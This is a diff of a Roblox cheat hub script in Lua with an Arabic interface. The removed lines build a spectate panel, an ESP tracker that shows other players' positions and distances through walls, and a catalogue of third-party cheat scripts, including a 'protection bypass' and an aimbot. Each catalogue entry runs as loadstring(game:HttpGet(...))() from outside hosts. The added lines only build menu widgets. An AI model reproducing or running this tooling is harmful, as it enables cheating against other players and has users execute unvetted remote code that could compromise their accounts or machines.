-local StopSpecBtn = Instance.new("TextButton")
-StopSpecBtn.Size = UDim2.new(1, -20, 0, 26)
-StopSpecBtn.Position = UDim2.new(0, 10, 0, 38)
-StopSpecBtn.BackgroundColor3 = Color3.fromRGB(180, 30, 40)
-StopSpecBtn.Text = "❌ إيقاف المراقبة وإعادة الكاميرا لشخصيتي"
-StopSpecBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-StopSpecBtn.Font = Enum.Font.SourceSansBold
-StopSpecBtn.TextSize = 11
-StopSpecBtn.ZIndex = 21
-StopSpecBtn.Parent = SpecFrame
-Instance.new("UICorner", StopSpecBtn).CornerRadius = UDim.new(0, 5)
-
-local SpecScroll = Instance.new("ScrollingFrame")
-SpecScroll.Size = UDim2.new(1, -20, 1, -74)
-SpecScroll.Position = UDim2.new(0, 10, 0, 68)
-SpecScroll.BackgroundTransparency = 1
-SpecScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-SpecScroll.ScrollBarThickness = 3
-SpecScroll.ZIndex = 21
-SpecScroll.Parent = SpecFrame
-
-local SpecLayout = Instance.new("UIListLayout")
-SpecLayout.SortOrder = Enum.SortOrder.LayoutOrder
-SpecLayout.Padding = UDim.new(0, 5)
-SpecLayout.Parent = SpecScroll
-
-SpecModalBtn.MouseButton1Click:Connect(function() SpecFrame.Visible = true end)
-CloseSpecBtn.MouseButton1Click:Connect(function() SpecFrame.Visible = false end)
-
-StopSpecBtn.MouseButton1Click:Connect(function()
-    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-        workspace.CurrentCamera.CameraSubject = LocalPlayer.Character.Humanoid
-    end
-end)
-
-local function updateSpecPlayersList()
-    for _, child in ipairs(SpecScroll:GetChildren()) do
-        if child:IsA("Frame") then child:Destroy() end
-    end
-
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= LocalPlayer then
-            local card = Instance.new("Frame")
-            card.Size = UDim2.new(1, -6, 0, 36)
-            card.BackgroundColor3 = Color3.fromRGB(24, 24, 34)
-            card.ZIndex = 22
-            card.Parent = SpecScroll
-            Instance.new("UICorner", card).CornerRadius = UDim.new(0, 5)
-
-            local pImg = Instance.new("ImageLabel")
-            pImg.Size = UDim2.new(0, 28, 0, 28)
-            pImg.Position = UDim2.new(0, 5, 0.5, -14)
-            pImg.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
-            pImg.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(p.UserId) .. "&w=150&h=150"
-            pImg.ZIndex = 23
-            pImg.Parent = card
-            Instance.new("UICorner", pImg).CornerRadius = UDim.new(1, 0)
-
-            local pName = Instance.new("TextLabel")
-            pName.Size = UDim2.new(1, -110, 1, 0)
-            pName.Position = UDim2.new(0, 38, 0, 0)
-            pName.BackgroundTransparency = 1
-            pName.Text = p.DisplayName ~= "" and p.DisplayName or p.Name
-            pName.TextColor3 = Color3.fromRGB(255, 255, 255)
-            pName.Font = Enum.Font.SourceSansBold
-            pName.TextSize = 11.5
-            pName.TextXAlignment = Enum.TextXAlignment.Left
-            pName.ZIndex = 23
-            pName.Parent = card
-
-            local watchBtn = Instance.new("TextButton")
-            watchBtn.Size = UDim2.new(0, 62, 0, 24)
-            watchBtn.Position = UDim2.new(1, -68, 0.5, -12)
-            watchBtn.BackgroundColor3 = Color3.fromRGB(30, 120, 180)
-            watchBtn.Text = "مراقبة 👁️"
-            watchBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-            watchBtn.Font = Enum.Font.SourceSansBold
-            watchBtn.TextSize = 10
-            watchBtn.ZIndex = 23
-            watchBtn.Parent = card
-            Instance.new("UICorner", watchBtn).CornerRadius = UDim.new(0, 4)
-
-            watchBtn.MouseButton1Click:Connect(function()
-                if p.Character and p.Character:FindFirstChild("Humanoid") then
-                    workspace.CurrentCamera.CameraSubject = p.Character.Humanoid
-                end
-            end)
-        end
-    end
-    SpecScroll.CanvasSize = UDim2.new(0, 0, 0, SpecLayout.AbsoluteContentSize.Y + 10)
-end
-
-SpecModalBtn.MouseButton1Click:Connect(updateSpecPlayersList)
-
----------------------------------------------------------
--- نافذة وميزة كشف وتتبع مكان شخص (ESP Tracker System)
----------------------------------------------------------
-local TrackerFrame = Instance.new("Frame")
-TrackerFrame.Size = UDim2.new(1, 0, 1, 0)
-TrackerFrame.BackgroundColor3 = Color3.fromRGB(16, 16, 24)
-TrackerFrame.Visible = false
-TrackerFrame.ZIndex = 20
-TrackerFrame.Parent = SettingsTab
-
-local TrackerHeader = Instance.new("Frame")
-TrackerHeader.Size = UDim2.new(1, 0, 0, 32)
-TrackerHeader.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
-TrackerHeader.ZIndex = 21
-TrackerHeader.Parent = TrackerFrame
-
-local TrackerTitle = Instance.new("TextLabel")
-TrackerTitle.Size = UDim2.new(1, -70, 1, 0)
-TrackerTitle.Position = UDim2.new(0, 10, 0, 0)
-TrackerTitle.BackgroundTransparency = 1
-TrackerTitle.Text = "📍 اختر لاعباً لكشف وتتبع مكانه:"
-TrackerTitle.TextColor3 = Color3.fromRGB(255, 215, 0)
-TrackerTitle.Font = Enum.Font.SourceSansBold
-TrackerTitle.TextSize = 11.5
-TrackerTitle.TextXAlignment = Enum.TextXAlignment.Left
-TrackerTitle.ZIndex = 22
-TrackerTitle.Parent = TrackerHeader
-
-local CloseTrackerBtn = Instance.new("TextButton")
-CloseTrackerBtn.Size = UDim2.new(0, 50, 0, 22)
-CloseTrackerBtn.Position = UDim2.new(1, -55, 0, 5)
-CloseTrackerBtn.BackgroundColor3 = Color3.fromRGB(180, 30, 40)
-CloseTrackerBtn.Text = "إغلاق"
-CloseTrackerBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-CloseTrackerBtn.Font = Enum.Font.SourceSansBold
-CloseTrackerBtn.TextSize = 10
-CloseTrackerBtn.ZIndex = 22
-CloseTrackerBtn.Parent = TrackerHeader
-Instance.new("UICorner", CloseTrackerBtn).CornerRadius = UDim.new(0, 4)
-
-local StopAllTrackBtn = Instance.new("TextButton")
-StopAllTrackBtn.Size = UDim2.new(1, -20, 0, 26)
-StopAllTrackBtn.Position = UDim2.new(0, 10, 0, 38)
-StopAllTrackBtn.BackgroundColor3 = Color3.fromRGB(180, 30, 40)
-StopAllTrackBtn.Text = "❌ إيقاف كشف وتتبع الجميع"
-StopAllTrackBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-StopAllTrackBtn.Font = Enum.Font.SourceSansBold
-StopAllTrackBtn.TextSize = 11
-StopAllTrackBtn.ZIndex = 21
-StopAllTrackBtn.Parent = TrackerFrame
-Instance.new("UICorner", StopAllTrackBtn).CornerRadius = UDim.new(0, 5)
-
-local TrackerScroll = Instance.new("ScrollingFrame")
-TrackerScroll.Size = UDim2.new(1, -20, 1, -74)
-TrackerScroll.Position = UDim2.new(0, 10, 0, 68)
-TrackerScroll.BackgroundTransparency = 1
-TrackerScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-TrackerScroll.ScrollBarThickness = 3
-TrackerScroll.ZIndex = 21
-TrackerScroll.Parent = TrackerFrame
-
-local TrackerLayout = Instance.new("UIListLayout")
-TrackerLayout.SortOrder = Enum.SortOrder.LayoutOrder
-TrackerLayout.Padding = UDim.new(0, 5)
-TrackerLayout.Parent = TrackerScroll
-
-TrackerModalBtn.MouseButton1Click:Connect(function() TrackerFrame.Visible = true end)
-CloseTrackerBtn.MouseButton1Click:Connect(function() TrackerFrame.Visible = false end)
-
-local activeTrackers = {}
-
-local function removeTracker(player)
-    if activeTrackers[player] then
-        if activeTrackers[player].gui then activeTrackers[player].gui:Destroy() end
-        activeTrackers[player] = nil
-    end
-end
-
-StopAllTrackBtn.MouseButton1Click:Connect(function()
-    for p, _ in pairs(activeTrackers) do
-        removeTracker(p)
-    end
-end)
-
-local function toggleTracker(player)
-    if activeTrackers[player] then
-        removeTracker(player)
-        return false
-    else
-        local trGui = Instance.new("BillboardGui")
-        trGui.Name = "BenESPTracker_" .. player.Name
-        trGui.Size = UDim2.new(0, 130, 0, 30)
-        trGui.AlwaysOnTop = true
-        trGui.Parent = ScreenGui
-
-        local trFrame = Instance.new("Frame")
-        trFrame.Size = UDim2.new(1, 0, 1, 0)
-        trFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
-        trFrame.BackgroundTransparency = 0.2
-        trFrame.Parent = trGui
-        Instance.new("UICorner", trFrame).CornerRadius = UDim.new(0, 6)
-
-        local trStroke = Instance.new("UIStroke")
-        trStroke.Color = Color3.fromRGB(255, 180, 0)
-        trStroke.Thickness = 1.2
-        trStroke.Parent = trFrame
-
-        local pImg = Instance.new("ImageLabel")
-        pImg.Size = UDim2.new(0, 22, 0, 22)
-        pImg.Position = UDim2.new(0, 4, 0.5, -11)
-        pImg.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-        pImg.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(player.UserId) .. "&w=150&h=150"
-        pImg.Parent = trFrame
-        Instance.new("UICorner", pImg).CornerRadius = UDim.new(1, 0)
-
-        local trLbl = Instance.new("TextLabel")
-        trLbl.Size = UDim2.new(1, -30, 1, 0)
-        trLbl.Position = UDim2.new(0, 28, 0, 0)
-        trLbl.BackgroundTransparency = 1
-        trLbl.Text = (player.DisplayName ~= "" and player.DisplayName or player.Name) .. "\n..."
-        trLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
-        trLbl.Font = Enum.Font.SourceSansBold
-        trLbl.TextSize = 9.5
-        trLbl.TextXAlignment = Enum.TextXAlignment.Left
-        trLbl.Parent = trFrame
-
-        activeTrackers[player] = {gui = trGui, label = trLbl}
-        return true
-    end
-end
-
-RunService.RenderStepped:Connect(function()
-    for p, data in pairs(activeTrackers) do
-        if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-            data.gui.Adornee = p.Character.HumanoidRootPart
-            local dist = math.floor((p.Character.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude)
-            data.label.Text = (p.DisplayName ~= "" and p.DisplayName or p.Name) .. "\n📍 " .. tostring(dist) .. " m"
-        else
-            data.label.Text = (p.DisplayName ~= "" and p.DisplayName or p.Name) .. "\n❌ غائب"
-        end
-    end
-end)
-
-local function updateTrackerPlayersList()
-    for _, child in ipairs(TrackerScroll:GetChildren()) do
-        if child:IsA("Frame") then child:Destroy() end
-    end
-
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= LocalPlayer then
-            local card = Instance.new("Frame")
-            card.Size = UDim2.new(1, -6, 0, 36)
-            card.BackgroundColor3 = Color3.fromRGB(24, 24, 34)
-            card.ZIndex = 22
-            card.Parent = TrackerScroll
-            Instance.new("UICorner", card).CornerRadius = UDim.new(0, 5)
-
-            local pImg = Instance.new("ImageLabel")
-            pImg.Size = UDim2.new(0, 28, 0, 28)
-            pImg.Position = UDim2.new(0, 5, 0.5, -14)
-            pImg.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
-            pImg.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(p.UserId) .. "&w=150&h=150"
-            pImg.ZIndex = 23
-            pImg.Parent = card
-            Instance.new("UICorner", pImg).CornerRadius = UDim.new(1, 0)
-
-            local pName = Instance.new("TextLabel")
-            pName.Size = UDim2.new(1, -110, 1, 0)
-            pName.Position = UDim2.new(0, 38, 0, 0)
-            pName.BackgroundTransparency = 1
-            pName.Text = p.DisplayName ~= "" and p.DisplayName or p.Name
-            pName.TextColor3 = Color3.fromRGB(255, 255, 255)
-            pName.Font = Enum.Font.SourceSansBold
-            pName.TextSize = 11.5
-            pName.TextXAlignment = Enum.TextXAlignment.Left
-            pName.ZIndex = 23
-            pName.Parent = card
-
-            local trackBtn = Instance.new("TextButton")
-            trackBtn.Size = UDim2.new(0, 62, 0, 24)
-            trackBtn.Position = UDim2.new(1, -68, 0.5, -12)
-            trackBtn.BackgroundColor3 = activeTrackers[p] and Color3.fromRGB(180, 40, 40) or Color3.fromRGB(180, 110, 30)
-            trackBtn.Text = activeTrackers[p] and "إلغاء ❌" or "تتبع 📍"
-            trackBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-            trackBtn.Font = Enum.Font.SourceSansBold
-            trackBtn.TextSize = 10
-            trackBtn.ZIndex = 23
-            trackBtn.Parent = card
-            Instance.new("UICorner", trackBtn).CornerRadius = UDim.new(0, 4)
-
-            trackBtn.MouseButton1Click:Connect(function()
-                local isTracking = toggleTracker(p)
-                trackBtn.Text = isTracking and "إلغاء ❌" or "تتبع 📍"
-                trackBtn.BackgroundColor3 = isTracking and Color3.fromRGB(180, 40, 40) or Color3.fromRGB(180, 110, 30)
-            end)
-        end
-    end
-    TrackerScroll.CanvasSize = UDim2.new(0, 0, 0, TrackerLayout.AbsoluteContentSize.Y + 10)
-end
-
-TrackerModalBtn.MouseButton1Click:Connect(updateTrackerPlayersList)
-
----------------------------------------------------------
--- 3. سكربتات المابات المحدثة بالكامل
----------------------------------------------------------
-local mapDataList = {
-    {
-        name = "سرقة البيض",
-        image = fetchAsset("https://d.top4top.io/p_3922v5lak1.jpg", "egg_steal"),
-        scripts = {
-            {title = "سكربت فلفل", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()]]},
-            {title = "الأزرق (كسر حماية)", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/PulseZax/Loader/refs/heads/main/.lua"))()]]},
-            {title = "افضل سكربت KAIDO ⭐", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=v1yksgch"))()]]},
-        }
-    },
-    {
-        name = "99 ليلة",
-        image = fetchAsset("https://g.top4top.io/p_39369bu7i0.jpeg", "nights_99"),
-        scripts = {
-            {title = "سكربت فاب فيودوير", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/nightsintheforest.lua", true))()]]},
-            {title = "سكربت هوتاو هوب", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/SLK-gaming/Hutao-Hub/refs/heads/main/99-Nights-In-The-Forest.txt"))()]]},
-            {title = "سكربت جيك لودر", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/GEC0/gec/refs/heads/main/Gec.Loader", true))()]]},
-            {title = "سكربت ستري هوب", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/create-stree/STREE-HUB/refs/heads/main/Loader/Main.lua", true))()]]}
-        }
-    },
-    {
-        name = "كسر البيض",
-        image = fetchAsset("https://h.top4top.io/p_39365mdcw1.jpg", "egg_crack_new"),
-        scripts = {
-            {title = "سكربت أوروبوروس الجديد", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/joustingmatch/Ouroboros/main/loader.lua"))()]]}
-        }
-    },
-    {
-        name = "ماب كيبورد",
-        image = fetchAsset("https://i.top4top.io/p_3936thjrk0.jpg", "keyboard_map_new"),
-        scripts = {
-            {title = "هوشي هوب", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://hoshihub.site/loader.lua"))()]]},
-            {title = "أولينكا موبلينكا", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/OlejenkaMolejenka1337/script/refs/heads/main/scriptOBF.txt"))()]]},
-            {title = "شيزا هوب", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/Gerreiro68/ShizaHub/refs/heads/main/loader.lua"))()]]},
-            {title = "سحابة سنوي هوب", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://rawscripts.net/raw/X2-+1-Speed-Keyboard-Escape-or-Candy-and-Chocolate-Snowy-Hub-Auto-Win-Bypass-Obstacles-Teleport-More-238320"))()]]},
-            {title = "أفرليك هوب", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/Tarmaster/AverlikHub/refs/heads/main/Loader"))()]]}
-        }
-    },
-    {
-        name = "بلوكس فروت",
-        image = fetchAsset("https://f.top4top.io/p_3923xn5tv0.png", "blox_fruits"),
-        scripts = {
-            {title = "سكربت موز المباشر", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/bloxfruitsnokey/Banana/refs/heads/main/DB/script.luau"))()]]},
-            {title = "كوانتم أونيكس", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/Trustmenotcondom/QTONYX/refs/heads/main/QuantumOnyx.lua"))()]]},
-            {title = "جانتنج هوب", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://isnahamzah.site/SubscribeYTisnahamzah/gantenghub30"))()]]},
-            {title = "كايتون فايند فروت", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/WhiteX1208/Scripts/refs/heads/main/KaitunFindFruit.luau"))()]]},
-            {title = "ريدز في 2", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/UCT-hub/main/refs/heads/main/redz-v2"))()]]},
-            {title = "ايم بوت ديف أكسل PVP", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/itzaxl/DEVAXL/refs/heads/main/axlpvpblox.lua"))()]]},
-            {title = "دراغون أكس", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/Tdk-Dragon/DragonX.lua/refs/heads/main/DragonX.lua.txt"))()]]}
-        }
-    },
-    {
-        name = "ركوب حيوانات",
-        image = fetchAsset("https://c.top4top.io/p_39220ivke0.png", "ride_pet"),
-        scripts = {
-            {title = "سكربت ركوب الحيوانات الجديد 1", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://pastefy.app/P5tUDr3n/raw"))()]]},
-            {title = "سكربت هايڤ هوب", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://script.hive-hub.workers.dev/hive.lua"))()]]},
-            {title = "سكربت نولاج", requiresKey = "لا", code = [[loadstring(game:HttpGet("https://nolag.wtf/script.lua"))()]]}
-        }
-    }
-}
-
-local MapSearchBox = Instance.new("TextBox")
-MapSearchBox.Size = UDim2.new(1, -10, 0, 26)
-MapSearchBox.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
-MapSearchBox.PlaceholderText = "🔍 البحث عن ماب أو سكربت..."
-MapSearchBox.Text = ""
-MapSearchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-MapSearchBox.Font = Enum.Font.SourceSans
-MapSearchBox.TextSize = 11
-MapSearchBox.Parent = MapScriptsTab
-Instance.new("UICorner", MapSearchBox).CornerRadius = UDim.new(0, 6)
-
-local MapsScroll = Instance.new("ScrollingFrame")
-MapsScroll.Size = UDim2.new(1, -10, 0, 240)
-MapsScroll.Position = UDim2.new(0, 0, 0, 32)
-MapsScroll.BackgroundTransparency = 1
-MapsScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-MapsScroll.ScrollBarThickness = 3
-MapsScroll.Parent = MapScriptsTab
-
-local MapsGrid = Instance.new("UIGridLayout")
-MapsGrid.CellSize = UDim2.new(0, 175, 0, 110)
-MapsGrid.CellPadding = UDim2.new(0, 10, 0, 10)
-MapsGrid.Parent = MapsScroll
-
-local ScriptDetailFrame = Instance.new("Frame")
-ScriptDetailFrame.Size = UDim2.new(1, -10, 0, 240)
-ScriptDetailFrame.Position = UDim2.new(0, 0, 0, 32)
-ScriptDetailFrame.BackgroundTransparency = 1
-ScriptDetailFrame.Visible = false
-ScriptDetailFrame.Parent = MapScriptsTab
-
-local BackToMapsBtn = Instance.new("TextButton")
-BackToMapsBtn.Size = UDim2.new(0, 100, 0, 22)
-BackToMapsBtn.BackgroundColor3 = Color3.fromRGB(180, 30, 40)
-BackToMapsBtn.Text = "↩ عودة للمابات"
-BackToMapsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-BackToMapsBtn.Font = Enum.Font.SourceSansBold
-BackToMapsBtn.TextSize = 10
-BackToMapsBtn.Parent = ScriptDetailFrame
-Instance.new("UICorner", BackToMapsBtn).CornerRadius = UDim.new(0, 5)
-
-local ScriptsScroll = Instance.new("ScrollingFrame")
-ScriptsScroll.Size = UDim2.new(1, 0, 0, 212)
-ScriptsScroll.Position = UDim2.new(0, 0, 0, 28)
-ScriptsScroll.BackgroundTransparency = 1
-ScriptsScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-ScriptsScroll.ScrollBarThickness = 3
-ScriptsScroll.Parent = ScriptDetailFrame
-
-local ScriptsLayout = Instance.new("UIListLayout")
-ScriptsLayout.SortOrder = Enum.SortOrder.LayoutOrder
-ScriptsLayout.Padding = UDim.new(0, 6)
-ScriptsLayout.Parent = ScriptsScroll
-
-BackToMapsBtn.MouseButton1Click:Connect(function()
-    ScriptDetailFrame.Visible = false
-    MapsScroll.Visible = true
-end)
-
-local function openMapScripts(mapInfo)
-    for _, child in ipairs(ScriptsScroll:GetChildren()) do
-        if child:IsA("Frame") then child:Destroy() end
-    end
-
-    for _, sc in ipairs(mapInfo.scripts) do
-        local card = Instance.new("Frame")
-        card.Size = UDim2.new(1, -6, 0, 54)
-        card.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
-        card.Parent = ScriptsScroll
-        Instance.new("UICorner", card).CornerRadius = UDim.new(0, 6)
-
-        local title = Instance.new("TextLabel")
-        title.Size = UDim2.new(0.65, 0, 0, 20)
-        title.Position = UDim2.new(0, 8, 0, 4)
-        title.BackgroundTransparency = 1
-        title.Text = "⚡ " .. sc.title
-        title.TextColor3 = Color3.fromRGB(255, 215, 0)
-        title.Font = Enum.Font.SourceSansBold
-        title.TextSize = 11
-        title.TextXAlignment = Enum.TextXAlignment.Left
-        title.Parent = card
-
-        local keyBadge = Instance.new("TextLabel")
-        keyBadge.Size = UDim2.new(0.65, 0, 0, 18)
-        keyBadge.Position = UDim2.new(0, 8, 0, 26)
-        keyBadge.BackgroundTransparency = 1
-        keyBadge.Text = (sc.requiresKey == "نعم") and "🔑 يحتاج مفتاح" or "🟢 بدون مفتاح"
-        keyBadge.TextColor3 = (sc.requiresKey == "نعم") and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(100, 255, 100)
-        keyBadge.Font = Enum.Font.SourceSans
-        keyBadge.TextSize = 9.5
-        keyBadge.TextXAlignment = Enum.TextXAlignment.Left
-        keyBadge.Parent = card
-
-        local runBtn = Instance.new("TextButton")
-        runBtn.Size = UDim2.new(0.28, 0, 0, 30)
-        runBtn.Position = UDim2.new(0.7, 0, 0.5, -15)
-        runBtn.BackgroundColor3 = Color3.fromRGB(180, 25, 35)
-        runBtn.Text = "▶️ تشغيل"
-        runBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        runBtn.Font = Enum.Font.SourceSansBold
-        runBtn.TextSize = 10.5
-        runBtn.Parent = card
-        Instance.new("UICorner", runBtn).CornerRadius = UDim.new(0, 5)
-
-        runBtn.MouseButton1Click:Connect(function()
-            local success, err = pcall(function()
-                local func, loadErr = loadstring(sc.code)
-                if func then func() else error(loadErr) end
-            end)
-            runBtn.Text = success and "✅ تم التشغيل" or "❌ فشل التشغيل"
-            task.wait(1.5)
-            runBtn.Text = "▶️ تشغيل"
+local function addChilliAccordion(titleText, builderFunc)
+    local folderFrame = Instance.new("Frame")
+    folderFrame.Size = UDim2.new(1, 0, 0, 36)
+    folderFrame.BackgroundTransparency = 1
+    folderFrame.ZIndex = 3
+    folderFrame.Parent = CenterScroll
+
+    local headBtn = Instance.new("TextButton")
+    headBtn.Size = UDim2.new(1, 0, 0, 36)
+    headBtn.BackgroundTransparency = 1
+    headBtn.Text = "  >  " .. titleText
+    headBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    headBtn.Font = Enum.Font.FredokaOne
+    headBtn.TextSize = 18
+    headBtn.TextXAlignment = Enum.TextXAlignment.Center
+    headBtn.ZIndex = 3
+    headBtn.Parent = folderFrame
+
+    local blackStroke = Instance.new("UIStroke")
+    blackStroke.Color = Color3.fromRGB(0, 0, 0)
+    blackStroke.Thickness = 2
+    blackStroke.Parent = headBtn
+
+    local contentHolder = Instance.new("Frame")
+    contentHolder.Size = UDim2.new(1, 0, 0, 0)
+    contentHolder.Position = UDim2.new(0, 0, 0, 38)
+    contentHolder.BackgroundTransparency = 1
+    contentHolder.Visible = false
+    contentHolder.ZIndex = 3
+    contentHolder.Parent = folderFrame
+
+    local contentLayout = Instance.new("UIListLayout")
+    contentLayout.Padding = UDim.new(0, 6)
+    contentLayout.Parent = contentHolder
+
+    local isOpen = false
+
+    local function addToggleRow(nameText, onToggle)
+        local rowFrame = Instance.new("Frame")
+        rowFrame.Size = UDim2.new(1, 0, 0, 36)
+        rowFrame.BackgroundColor3 = Color3.fromRGB(16, 26, 46)
+        rowFrame.ZIndex = 3
+        rowFrame.Parent = contentHolder
+        Instance.new("UICorner", rowFrame).CornerRadius = UDim.new(0, 6)
+
+        local rowStroke = Instance.new("UIStroke")
+        rowStroke.Color = currentAccentColor
+        rowStroke.Thickness = 1.2
+        rowStroke.Parent = rowFrame
+        table.insert(registeredOptionStrokes, rowStroke)
+
+        local nameLbl = Instance.new("TextLabel")
+        nameLbl.Size = UDim2.new(1, -50, 1, 0)
+        nameLbl.Position = UDim2.new(0, 10, 0, 0)
+        nameLbl.BackgroundTransparency = 1
+        nameLbl.Text = nameText
+        nameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+        nameLbl.Font = Enum.Font.FredokaOne
+        nameLbl.TextSize = 14
+        nameLbl.TextXAlignment = Enum.TextXAlignment.Left
+        nameLbl.ZIndex = 4
+        nameLbl.Parent = rowFrame
+
+        local toggleBtn = Instance.new("TextButton")
+        toggleBtn.Size = UDim2.new(0, 22, 0, 22)
+        toggleBtn.Position = UDim2.new(1, -32, 0.5, -11)
+        toggleBtn.BackgroundColor3 = Color3.fromRGB(20, 30, 50)
+        toggleBtn.Text = ""
+        toggleBtn.ZIndex = 4
+        toggleBtn.Parent = rowFrame
+        Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 4)
+
+        local innerBox = Instance.new("Frame")
+        innerBox.Size = UDim2.new(1, -6, 1, -6)
+        innerBox.Position = UDim2.new(0, 3, 0, 3)
+        innerBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        innerBox.Visible = false
+        innerBox.ZIndex = 5
+        innerBox.Parent = toggleBtn
+        Instance.new("UICorner", innerBox).CornerRadius = UDim.new(0, 2)
+
+        local state = false
+        toggleBtn.MouseButton1Click:Connect(function()
+            playUiSound(SOUND_CLICK, 1, 0.35)
+            state = not state
+            innerBox.Visible = state
+            if onToggle then onToggle(state) end
         end)
     end
-    ScriptsScroll.CanvasSize = UDim2.new(0, 0, 0, ScriptsLayout.AbsoluteContentSize.Y + 10)
-    MapsScroll.Visible = false
-    ScriptDetailFrame.Visible = true
-end
 
-local function renderMapCards(filterText)
-    for _, child in ipairs(MapsScroll:GetChildren()) do
-        if child:IsA("Frame") then child:Destroy() end
+    local function addActionRow(nameText, onClick)
+        local rowFrame = Instance.new("Frame")
+        rowFrame.Size = UDim2.new(1, 0, 0, 34)
+        rowFrame.BackgroundColor3 = Color3.fromRGB(16, 26, 46)
+        rowFrame.ZIndex = 3
+        rowFrame.Parent = contentHolder
+        Instance.new("UICorner", rowFrame).CornerRadius = UDim.new(0, 6)
+
+        local rowStroke = Instance.new("UIStroke")
+        rowStroke.Color = currentAccentColor
+        rowStroke.Thickness = 1.2
+        rowStroke.Parent = rowFrame
+        table.insert(registeredOptionStrokes, rowStroke)
+
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, 0, 1, 0)
+        btn.BackgroundTransparency = 1
+        btn.Text = nameText
+        btn.TextColor3 = Color3.fromRGB(240, 240, 255)
+        btn.Font = Enum.Font.FredokaOne
+        btn.TextSize = 14
+        btn.TextXAlignment = Enum.TextXAlignment.Center
+        btn.ZIndex = 4
+        btn.Parent = rowFrame
+
+        btn.MouseButton1Click:Connect(function()
+            playUiSound(SOUND_CLICK, 1, 0.35)
+            if onClick then onClick() end
+        end)
     end
 
-    for _, map in ipairs(mapDataList) do
-        if filterText == "" or string.find(string.lower(map.name), string.lower(filterText)) then
-            local card = Instance.new("Frame")
-            card.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
-            card.ClipsDescendants = true
-            card.Parent = MapsScroll
-            Instance.new("UICorner", card).CornerRadius = UDim.new(0, 8)
+    builderFunc(addToggleRow, addActionRow, contentHolder)
 
-            local mapImg = Instance.new("ImageLabel")
-            mapImg.Size = UDim2.new(1, 0, 0, 60)
-            mapImg.Image = map.image
-            mapImg.ScaleType = Enum.ScaleType.Crop
-            mapImg.Parent = card
-            Instance.new("UICorner", mapImg).CornerRadius = UDim.new(0, 8)
+    headBtn.MouseButton1Click:Connect(function()
+        playUiSound(SOUND_CLICK, 1, 0.35)
+        isOpen = not isOpen
+        headBtn.Text = (isOpen and "  ˅  " or "  >  ") .. titleText
+        contentHolder.Visible = isOpen
 
-            local title = Instance.new("TextLabel")
-            title.Size = UDim2.new(1, -8, 0, 18)
-            title.Position = UDim2.new(0, 4, 0, 62)
-            title.BackgroundTransparency = 1
-            title.Text = map.name
-            title.TextColor3 = Color3.fromRGB(255, 255, 255)
-            title.Font = Enum.Font.SourceSansBold
-            title.TextSize = 10.5
-            title.TextXAlignment = Enum.TextXAlignment.Left
-            title.Parent = card
+        if isOpen then
+            task.wait(0.02)
+            local totalHeight = contentLayout.AbsoluteContentSize.Y + 15
+            contentHolder.Size = UDim2.new(1, 0, 0, totalHeight)
+            folderFrame.Size = UDim2.new(1, 0, 0, totalHeight + 40)
+        else
